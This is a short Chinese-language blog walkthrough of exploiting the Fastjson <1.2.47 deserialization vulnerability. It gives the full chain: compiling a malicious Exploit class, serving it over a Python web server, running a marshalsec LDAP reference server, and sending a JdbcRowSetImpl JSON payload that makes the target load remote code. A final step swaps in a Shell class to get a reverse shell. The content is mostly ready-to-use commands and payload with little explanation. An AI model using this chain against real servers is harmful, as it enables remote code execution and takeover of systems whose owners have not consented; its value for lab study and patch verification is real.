**Fastjson<1.2.47反序列化漏洞为例**

1、此时/tmp目录
![img](https://img-blog.csdnimg.cn/20191113145947722.png)
2、编译Exploit.java
javac Exploit.java
![img](https://img-blog.csdnimg.cn/20191113145953647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTg5MjU4,size_16,color_FFFFFF,t_70)
3、 使用python搭建一个临时的web服务

[root@qiqi wordpress]# python -m SimpleHTTPServer  1111

Serving HTTP on 0.0.0.0 port 1111 ...

Ps：此步是为了接收LDAP服务重定向请求，需要在payload的目录下开启此web服务，这样才可以访问到payload文件

![img](https://img-blog.csdnimg.cn/20191113150003676.png)
4、服务器使用marshalsec开启LDAP服务监听：

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:1111/#Exploit 9999

Ps：使用marshalsec工具快捷的开启LDAP

服务。借助LDAP服务将LDAP reference result 重定向到web服务器。

LDAP动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。

![img](https://img-blog.csdnimg.cn/2019111315000946.png)

5、 Exploit.class恶意类执行的命令是：

在tmp目录下创建名为qiqi的文件。

Burp发包

使用EXP：

{

  "name":{

    "@type":"java.lang.Class",
    
    "val":"com.sun.rowset.JdbcRowSetImpl"

  },

  "x":{

    "@type":"com.sun.rowset.JdbcRowSetImpl",
    
    "dataSourceName":"ldap://ip:9999/Exploit",
    
    "autoCommit":true

  }



}

![img](https://img-blog.csdnimg.cn/20191113150038512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTg5MjU4,size_16,color_FFFFFF,t_70)
此时/tmp目录
![img](https://img-blog.csdnimg.cn/20191113150044774.png)

GETSHELL

同上步骤，不过是用Shell.java文件生成恶意类反弹shell

![img](https://img-blog.csdnimg.cn/20191113150049164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTg5MjU4,size_16,color_FFFFFF,t_70)

![img](https://img-blog.csdnimg.cn/20191113150054268.png)